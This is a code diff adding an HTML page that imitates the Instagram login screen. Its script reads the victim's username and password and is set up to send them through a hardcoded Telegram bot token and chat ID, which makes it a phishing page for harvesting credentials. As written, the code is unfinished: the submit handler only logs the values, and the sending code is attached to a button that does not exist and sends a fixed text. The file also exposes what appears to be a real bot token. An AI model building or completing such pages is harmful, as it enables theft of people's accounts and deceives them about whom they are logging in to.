@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login Page</title>
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      max-width: 350px;
+      width: 100%;
+    }
+
+    .login-container {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .login-container h1 {
+      font-family: 'Billabong', cursive;
+      font-size: 50px;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      margin-bottom: 10px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+      font-size: 14px;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      border: none;
+      border-radius: 3px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 10px 0;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .divider::before {
+      margin-right: 10px;
+    }
+
+    .divider::after {
+      margin-left: 10px;
+    }
+
+    .fb-login-button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4267b2;
+      border: none;
+      border-radius: 3px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    .forgot-password {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 12px;
+    }
+
+    .signup-container {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .signup-container a {
+      color: #3897f0;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="login-container">
+      <h1>Instagram</h1>
+      <form id="loginForm">
+        <div class="input-group">
+          <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        </div>
+        <div class="input-group">
+          <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="login-button">Log In</button>
+      </form>
+      <div class="divider">OR</div>
+      <button class="fb-login-button">Log in with Facebook</button>
+      <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+    <div class="signup-container">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+      event.preventDefault(); // Formani yuborishni oldini olish
+
+      const token = '7056273755:AAHP6gzkwRlyTbxH9Gy7Qn8o8HbL_JBewWo'
+      const url = `https://api.telegram.org/bot${token}/Sendmessage`
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      console.log('Username:', username);
+      console.log('Password:', password);
+    });
+    document.getElementById('sendMessageButton').addEventListener('click', function () {
+      const API_TOKEN = '7056273755:AAHP6gzkwRlyTbxH9Gy7Qn8o8HbL_JBewWo';
+      const CHAT_ID = '5116480519';
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const MESSAGE = 'Bu botga yuborilayotgan habar';
+
+      const url = `https://api.telegram.org/bot${API_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: MESSAGE
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('Habar yuborildi!');
+          } else {
+            alert('Xato: ' + data.description);
+          }
+        })
+        .catch(error => {
+          console.error('Xato:', error);
+          alert('Xato yuz berdi: ' + error.message);
+        });
+    });
+  </script>
+</body>
+
+</html>
